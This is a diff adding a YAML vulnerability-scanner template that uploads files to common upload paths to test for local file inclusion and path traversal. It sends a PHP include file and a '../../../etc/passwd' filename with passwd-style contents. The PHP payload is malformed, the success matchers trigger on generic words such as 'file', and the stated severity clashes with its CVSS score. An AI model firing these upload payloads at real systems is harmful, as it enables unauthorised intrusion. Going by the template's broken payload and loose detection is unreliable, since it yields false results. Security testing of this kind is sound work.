@@ -1,0 +1,83 @@
+id: medium-upload-file-inclusion-via-upload
+
+info:
+  name: File Upload - Local File Inclusion via Upload
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects file upload vulnerabilities that can lead to Local File Inclusion (LFI) attacks.
+    This template tests uploading files with path manipulation techniques to include sensitive files.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 7.1
+    cwe-id: CWE-22
+  tags: fileupload,lfi,path-traversal,inclusion
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="include.php"
+        Content-Type: text/plain
+        
+        <?php include(['file']); ?>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
+        Content-Type: text/plain
+        
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    payloads:
+      path:
+        - "{{BaseURL}}/upload"
+        - "{{BaseURL}}/upload.php"
+        - "{{BaseURL}}/fileupload"
+        - "{{BaseURL}}/file/upload"
+        - "{{BaseURL}}/admin/upload"
+        - "{{BaseURL}}/user/upload"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "upload"
+          - "success"
+          - "file"
+          - "saved"
+          - "uploaded"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        words:
+          - "error"
+          - "failed"
+          - "invalid"
+          - "not allowed"
+          - "forbidden"
+        condition: or
+        case-insensitive: true
+        negative: true
